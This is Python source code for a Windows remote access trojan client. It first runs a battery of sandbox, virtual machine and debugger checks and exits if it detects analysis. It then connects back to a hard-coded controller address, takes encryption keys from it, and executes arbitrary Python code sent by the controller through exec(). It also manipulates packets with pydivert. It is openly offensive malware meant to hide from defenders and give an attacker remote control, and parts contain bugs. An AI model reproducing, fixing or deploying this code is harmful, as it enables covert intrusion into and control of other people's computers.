#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Copyright (c) 2019 TheSphinx
"""
import socket, sys, os, time, ctypes, base64, ast, random, pydivert
from pathlib import Path
from Crypto import Random
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from threading import Thread

privatekey = ''
publickey  = ''
proxifier  = False
src_addr_inj = '127.0.0.1'

#region SandBox
def DLLs():
    import win32api
    import win32process
    EvidenceOfSandbox = []
    sandboxDLLs = ["sbiedll.dll","dbghelp.dll","api_log.dll","dir_watch.dll","pstorec.dll","vmcheck.dll","wpespy.dll"]
    allPids = win32process.EnumProcesses()
    for pid in allPids:
        try:
            hProcess = win32api.OpenProcess(0x0410, 0, pid)
            try:
                curProcessDLLs = win32process.EnumProcessModules(hProcess)
                for dll in curProcessDLLs:
                    dllName = str(win32process.GetModuleFileNameEx(hProcess, dll)).lower()
                    for sandboxDLL in sandboxDLLs:
                        if sandboxDLL in dllName:
                            if dllName not in EvidenceOfSandbox:
                                EvidenceOfSandbox.append(dllName)
            finally:
                    win32api.CloseHandle(hProcess)
        except:
                pass
    if EvidenceOfSandbox:
        return True
    else:
        return False
def ProcessNames():
    import win32pdh
    EvidenceOfSandbox = []
    sandboxProcesses = "vmsrvc", "tcpview", "wireshark", "visual basic", "fiddler", "vmware", "vbox", "process explorer", "autoit", "vboxtray", "vmtools", "vmrawdsk", "vmusbmouse", "vmvss", "vmscsi", "vmxnet", "vmx_svga", "vmmemctl", "df5serv", "vboxservice", "vmhgfs"
    _, runningProcesses = win32pdh.EnumObjectItems(None,None,'process', win32pdh.PERF_DETAIL_WIZARD)
    for process in runningProcesses:
        for sandboxProcess in sandboxProcesses:
            if sandboxProcess in str(process):
                if process not in EvidenceOfSandbox:
                    EvidenceOfSandbox.append(process)
                    break
    if not EvidenceOfSandbox:
        Return False
    else:
        Return True
def Debugger():
    from ctypes import *
    isDebuggerPresent = windll.kernel32.IsDebuggerPresent()
    if (isDebuggerPresent):
        return True
    else:
        return False
def DiskSize():
    import win32api
    import sys
    minDiskSizeGB = 50
    if len(sys.argv) > 1:
        minDiskSizeGB = float(sys.argv[1])
    _, diskSizeBytes, _ = win32api.GetDiskFreeSpaceEx()
    diskSizeGB = diskSizeBytes/1073741824
    if diskSizeGB > minDiskSizeGB:
        return False
    else:
        return True
def Fpath():
    import os
    EvidenceOfSandbox = []
    FilePathsToCheck = [r'C:\windows\Sysnative\Drivers\Vmmouse.sys', 
    r'C:\windows\Sysnative\Drivers\vm3dgl.dll', r'C:\windows\Sysnative\Drivers\vmdum.dll', 
    r'C:\windows\Sysnative\Drivers\vm3dver.dll', r'C:\windows\Sysnative\Drivers\vmtray.dll',
    r'C:\windows\Sysnative\Drivers\vmci.sys', r'C:\windows\Sysnative\Drivers\vmusbmouse.sys',
    r'C:\windows\Sysnative\Drivers\vmx_svga.sys', r'C:\windows\Sysnative\Drivers\vmxnet.sys',
    r'C:\windows\Sysnative\Drivers\VMToolsHook.dll', r'C:\windows\Sysnative\Drivers\vmhgfs.dll',
    r'C:\windows\Sysnative\Drivers\vmmousever.dll', r'C:\windows\Sysnative\Drivers\vmGuestLib.dll',
    r'C:\windows\Sysnative\Drivers\VmGuestLibJava.dll', r'C:\windows\Sysnative\Drivers\vmscsi.sys',
    r'C:\windows\Sysnative\Drivers\VBoxMouse.sys', r'C:\windows\Sysnative\Drivers\VBoxGuest.sys',
    r'C:\windows\Sysnative\Drivers\VBoxSF.sys', r'C:\windows\Sysnative\Drivers\VBoxVideo.sys',
    r'C:\windows\Sysnative\vboxdisp.dll', r'C:\windows\Sysnative\vboxhook.dll',
    r'C:\windows\Sysnative\vboxmrxnp.dll', r'C:\windows\Sysnative\vboxogl.dll',
    r'C:\windows\Sysnative\vboxoglarrayspu.dll', r'C:\windows\Sysnative\vboxoglcrutil.dll',
    r'C:\windows\Sysnative\vboxoglerrorspu.dll', r'C:\windows\Sysnative\vboxoglfeedbackspu.dll',
    r'C:\windows\Sysnative\vboxoglpackspu.dll', r'C:\windows\Sysnative\vboxoglpassthroughspu.dll',
    r'C:\windows\Sysnative\vboxservice.exe', r'C:\windows\Sysnative\vboxtray.exe',
    r'C:\windows\Sysnative\VBoxControl.exe']
    for FilePath in FilePathsToCheck:
        if os.path.isfile(FilePath):
            EvidenceOfSandbox.append(FilePath)
    if EvidenceOfSandbox:
        return True
    else:
        return False
def ProcessNumbers():
    import sys
    import win32pdh
    MinimumNumberOfProcesses = 50
    if len(sys.argv) == 2:
        MinimumNumberOfProcesses = sys.argv[1]
    _, runningProcesses = win32pdh.EnumObjectItems(None,None,'process', win32pdh.PERF_DETAIL_WIZARD)
    if len(runningProcesses) >= int(MinimumNumberOfProcesses):
        return False
    else:
        return True
def RAM():
    import ctypes
    class MEMORYSTATUSEX(ctypes.Structure):
        _fields_ = [
            ("dwLength", ctypes.c_ulong),
            ("dwMemoryLoad", ctypes.c_ulong),
            ("ullTotalPhys", ctypes.c_ulonglong),
            ("ullAvailPhys", ctypes.c_ulonglong),
            ("ullTotalPageFile", ctypes.c_ulonglong),
            ("ullAvailPageFile", ctypes.c_ulonglong),
            ("ullTotalVirtual", ctypes.c_ulonglong),
            ("ullAvailVirtual", ctypes.c_ulonglong),
            ("sullAvailExtendedVirtual", ctypes.c_ulonglong),
        ]
    memoryStatus = MEMORYSTATUSEX()
    memoryStatus.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
    ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(memoryStatus))
    if memoryStatus.ullTotalPhys/1073741824 > 1:
        return False
    else:
        return True
def RegKeyS():
    from winreg import *
    import os
    EvidenceOfSandbox = []
    sandboxStrings = ["vmware","virtualbox","vbox","qemu","xen"]
    HKLM_Keys_To_Check_Exist = [r'HARDWARE\DEVICEMAP\Scsi\Scsi Port 2\Scsi Bus 0\Target Id 0\Logical Unit Id 0\Identifier',
    r'SYSTEM\CurrentControlSet\Enum\SCSI\Disk&Ven_VMware_&Prod_VMware_Virtual_S',
    r'SYSTEM\CurrentControlSet\Control\CriticalDeviceDatabase\root#vmwvmcihostdev',
    r'SYSTEM\CurrentControlSet\Control\VirtualDeviceDrivers',
    r'SOFTWARE\VMWare, Inc.\VMWare Tools',
    r'SOFTWARE\Oracle\VirtualBox Guest Additions',
    r'HARDWARE\ACPI\DSDT\VBOX_']
    HKLM_Keys_With_Values_To_Parse = [r'SYSTEM\ControlSet001\Services\Disk\Enum\0',
    r'HARDWARE\Description\System\SystemBiosInformation',
    r'HARDWARE\Description\System\BIOS\SystemManufacturer',
    r'HARDWARE\Description\System\BIOS\SystemProductName',
    r'HARDWARE\Description\System\VideoBiosVersion',
    r'HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0'
    ]
    HKLM = ConnectRegistry(None,HKEY_LOCAL_MACHINE)
    for HKLM_Key in HKLM_Keys_To_Check_Exist:
        try:
            Opened_HKLM_Key = OpenKey(HKLM, HKLM_Key)
            EvidenceOfSandbox.append(HKLM_KEY)
        except:
            pass # Do nothing, no evidence of sandbox
    for HKLM_Key in HKLM_Keys_With_Values_To_Parse:
        try:
            Opened_HKLM_Key = OpenKey(HKLM, os.path.dirname(HKLM_Key))
            keyVal = QueryValueEx(Opened_HKLM_Key, os.path.basename(HKLM_Key))
            for sandboxString in sandboxStrings:
                if keyVal[0].lower().find(sandboxString):
                    EvidenceOfSandbox.append(HKLM_Key + " => " + keyVal[0].lower())
                    break
        except:
            pass # Do nothing, no evidence of sandbox
    if not EvidenceOfSandbox:
        return False
    else:
        return True
def RegSize():
    import sys
    import win32com
    from win32com.client import GetObject	
    minRegistrySizeMB = 55
    if len(sys.argv) > 1:
        minRegistrySizeMB	= int(sys.argv[1])
    regObjects = GetObject("winmgmts:").ExecQuery("SELECT CurrentSize FROM Win32_Registry")	
    for regObject in regObjects:
        if int(regObject.Properties_('CurrentSize')) > minRegistrySizeMB:
            return False
        else:
            return True
def getDetection():

    finalmiddle = 0
    valutation = 0

    if DLLs():
        finalmiddle += 1
    if ProcessNames():
        finalmiddle += 1
    if Debugger():
        finalmiddle += 1
    if DiskSize():
        finalmiddle += 1
    if Fpath():
        finalmiddle += 1
    if ProcessNumbers():
        finalmiddle += 1
    if RAM():
        finalmiddle += 1
    if RegKeyS():
        finalmiddle += 1
    if RegSize():
        finalmiddle += 1

    if finalmiddle <= 3:
        # 70% of possibility sandbox
        return False
    elif finalmiddle >= 4 and finalmiddle <= 8:
        # 50% - 20% of possibility sandbox
        return False
    else:
        # 20% - 10% of possibility sanbox - execute it might be a case
        return True
#endregion

def encrypt_message(a_message , publickey):
	try:
		encryptor = PKCS1_OAEP.new(publickey)
		encrypted_msg = encryptor.encrypt(a_message)
		encoded_encrypted_msg = base64.b64encode(encrypted_msg) # base64 encoded strings are database friendly
		return encoded_encrypted_msg
	except Exception as e:
		print("nCRYPTO: %s"%str(e))
def decrypt_message(encoded_encrypted_msg, privatekey):
	decryptor = PKCS1_OAEP.new(privatekey)
	decoded_encrypted_msg = base64.b64decode(encoded_encrypted_msg)
	decoded_decrypted_msg = decryptor.decrypt(ast.literal_eval(str(decoded_encrypted_msg)))
	return decoded_decrypted_msg
def split_str(seq, chunk, skip_tail=False):
    lst = []
    if chunk <= len(seq):
        lst.extend([seq[:chunk]])
        lst.extend(split_str(seq[chunk:], chunk, skip_tail))
    elif not skip_tail and seq:
        lst.extend([seq])
    return lst
def bs(s):
    return s.decode()
def sb(s):
    return s.encode()
def getshell():
    #return "\n" + os.path.dirname(os.path.realpath(__file__))
    return "\n" + os.getcwd()
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
def doSend(connection, command):
    try:
        # split message in chunks
        allchunks = split_str(command, 10) # ['exec', '...']
        # send all chunks length
        connection.send(sb('len>'+str(len(allchunks))))
        for packet in allchunks:
            message = encrypt_message(sb(packet), publickey)
            try:
                connection.send(message)
            except Exception as e:
                    print("doSend: %s"%str(e))
            callback = connection.recv(10)
    except:
        pass        
def decode(s, encoding="ascii", errors="replace"):
    return s.decode(encoding=encoding, errors=errors)       
def doRecv(s):
    global proxifier
    while True:
        if proxifier == False:
            try:
                chunkslen = bs(s.recv(4096)) # receive length
                chunkslen = int(chunkslen.split('>')[1]) # get ready to receive all packets
                print("[*] Receiving %s chunks"%str(chunkslen))
                buffer    = ''
                for x in range(chunkslen):
                    print ("[+] Received %s"%str(x))
                    data = bs(s.recv(4096))           
                    data = bs(decrypt_message(data,privatekey))
                    buffer += data
                    s.send(sb('ok'))
                return buffer
            except Exception as e:
                print("error: " + str(e))

def doIntercept():
    global proxifier
    print ("[*] Intercepting packet ...")
    with pydivert.WinDivert("tcp.SrcPort == %s"%int(PORT)) as w:
        proxifier = True
        for packet in w:
            print (">")
            packet.src_addr = packet.dst_addr
            w.send(packet, recalculate_checksum=True)
            proxifier = False
            break

if getDetection():
    os._exit(1)

HOST = '192.168.1.72'  
PORT = '2000'
thread = Thread(target = doIntercept)
thread.start()

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, int(PORT)))
            keys = bs(s.recv(4098))
            privatekey = keys.split('+++++')[1]
            publickey = keys.split('+++++')[2]
            privatekey = RSA.importKey(privatekey, passphrase=None) 
            publickey = RSA.importKey(publickey, passphrase=None) 
            print("[+] Keys ok.")
            while True:
                data = doRecv(s)
                #print(data)
                if data=="10":
                    doSend(s, "10")
                elif data=="11":
                    doSend(s, getshell())
                elif data=="exit":
                    os._exit(0)
                elif data[:2] == 'cd':
                    os.chdir(data[3:])
                    doSend(s, getshell())
                elif "+++++" in data:
                    try:
                        cmd = data.split('+++++')[1]
                        exec(cmd)
                        # ----------------------------------------------------
                        returnvalue = decode(run()) #byte array => string  #raised utf-8 codec error
                        # ----------------------------------------------------
                        doSend(s, returnvalue)
                        confirmcmdreceived = doRecv(s)
                        if confirmcmdreceived == "200":
                            doSend(s, getshell())
                    except Exception as e:
                        doSend(s, "client:" + str(e))
                elif data == "20":
                    doSend(s, '200')
                else:
                    doSend(s, getshell())

            
        s.close()
    except:
        #print("[*] Not connected")
        time.sleep(5)
